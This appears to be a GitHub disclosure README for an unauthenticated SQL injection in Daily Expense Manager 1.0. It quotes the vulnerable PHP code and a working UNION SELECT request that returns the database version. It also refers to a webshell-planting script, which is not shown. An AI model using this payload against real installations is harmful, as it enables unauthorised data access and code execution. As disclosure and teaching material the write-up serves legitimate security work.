# Daily Expense Manager 1.0 - Unauthenticated SQL Injection
SQL injection in Daily Expense Manager 1.0 allows for injection of SQL queries, resulting in information disclosure and remote code execution.

## Vulnerable Code
File: /Daily-Expense-Manager/readxp.php , Line: 16-23
```
<?php
include("functions.php");

if(isloggedin()==FALSE)
{

}
else
{
  
}
$sid=$_SESSION['id'];


//get search term
$searchTerm = $_GET['term'];
//get matched data from skills table
$query = $conn->query("SELECT * FROM expense WHERE pname like '%$searchTerm%' AND uid='$sid' and isdel='0' group by pname");
while ($row = $query->fetch_assoc()) {
    $data[] = $row['pname'];
}
//return json data
echo json_encode($data);
?>
```
The LoggedIn() function effectively does nothing to prevent unauthenticated users from accessing this file.
The `$SearchTerm` variable is not sanitized and is under control of the attacker.

## Proof-of-concept
The HTTP request below injects a UNION statement to retrieve the version of the underlying database.

HTTP Request
```
GET /Daily-Expense-Manager/readxp.php?term=asd%27%20UNION%20ALL%20SELECT%201,@@version,3,4,5,6--%20- HTTP/1.1
Host: [REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

HTTP Response:
```
HTTP/1.1 200 OK
Date: Mon, 22 Aug 2022 16:28:11 GMT
Server: Apache/2.4.53 (Debian)
Set-Cookie: PHPSESSID=h7jdflgm9l3d84lruefl5jie3h; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 25
Connection: close
Content-Type: text/html; charset=UTF-8

["10.5.12-MariaDB-1-log"]
```

## Script
A proof-of-concept script written in python 3.6.x is in this repository. Follow instructions to inject a webshell onto the target.

![Executing the proof-of-concept script](https://github.com/stefanhesselman/Daily-Expense-Manager-1.0-SQL-to-RCE/blob/main/demo.gif?raw=true)


## Links
Vendor Homepage: https://code-projects.org/daily-expense-manager-in-php-with-source-code/

Software Link: https://download-media.code-projects.org/2020/01/DAILY_EXPENSE_MANAGER_IN_PHP_WITH_SOURCE_CODE.zip
